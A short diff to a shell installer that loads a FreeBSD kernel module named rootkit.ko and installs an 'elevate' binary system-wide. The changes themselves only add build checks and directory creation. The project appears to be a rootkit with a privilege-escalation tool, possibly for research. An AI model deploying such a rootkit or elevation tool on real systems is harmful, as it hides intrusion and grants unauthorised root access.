@@ -57,10 +57,18 @@ kldstat -q -m rootkit >/dev/null 2>&1 ||
 	fail "rootkit.ko was not found in the kernel module list after loading"
 
 
+# Verify elevate was built successfully
+[ -f "$ELEVATE_BIN" ] || fail "Build did not create $ELEVATE_BIN"
+[ -x "$ELEVATE_BIN" ] || fail "$ELEVATE_BIN is not executable"
+
+
 # Install elevate
 printf '%s\n' '[*] Installing elevate...'
-install -m 755 "$ELEVATE_BIN" /usr/local/bin/elevate || fail "Failed to install elevate"
+install -d -m 755 /usr/local/bin ||
+    fail "Failed to create /usr/local/bin"
 
+install -m 755 "$ELEVATE_BIN" /usr/local/bin/elevate ||
+    fail "Failed to install elevate"
 
 # Print completion message
 printf '%s\n' '[+] Installation complete; module entry:'
